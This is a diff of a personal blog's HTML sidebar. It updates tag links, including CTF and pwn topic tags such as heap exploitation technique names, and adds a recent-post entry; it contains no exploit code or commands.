-		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
-		
-			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
-		
-			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
-		
-			<li><a href="/tags/git/">git<span>1</span></a></li>
-		
-			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
-		
-			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
-		
-			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
-		
-			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
+			<li><a href="/tags/人生/">人生<span>1</span></a></li>
 		
 			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
 		
+			<li><a href="/tags/buu刷题/">buu刷题<span>4</span></a></li>
+		
+			<li><a href="/tags/推免/">推免<span>1</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+		
 			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
 		
-			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
+			<li><a href="/tags/srop/">srop<span>1</span></a></li>
 		
-			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
+			<li><a href="/tags/book/">book<span>1</span></a></li>
 		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
 		
-			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
+			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
 		
-			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
+			<li><a href="/tags/flair/">flair<span>1</span></a></li>
 		
-			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
 		
-			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
+			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
+		
+			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
+		
+			<li><a href="/tags/leetcode/">leetcode<span>2</span></a></li>
+		
+			<li><a href="/tags/安装/">安装<span>1</span></a></li>
+		
+			<li><a href="/tags/《操作系统真相还原》/">《操作系统真相还原》<span>1</span></a></li>
+		
+			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>35</span></a></li>
+		   <li><a href="/tags">...<span>36</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1480,6 +1250,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/10/30/用随机梯度下降来优化人生/" ><i class="fa fa-file-o"></i>用随机梯度下降来优化人生</a>
+      </li>
     
       <li>
         <a href="/2021/10/21/心路历程/" ><i class="fa fa-file-o"></i>心路历程</a>
@@ -1495,10 +1269,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/08/26/leetcode之算法学习计划/" ><i class="fa fa-file-o"></i>leetcode之算法学习计划</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/07/LearnBlockchainbyBuildingOne/" ><i class="fa fa-file-o"></i>Learn Blockchain by Buildin...</a>
       </li>
     
   </ul>
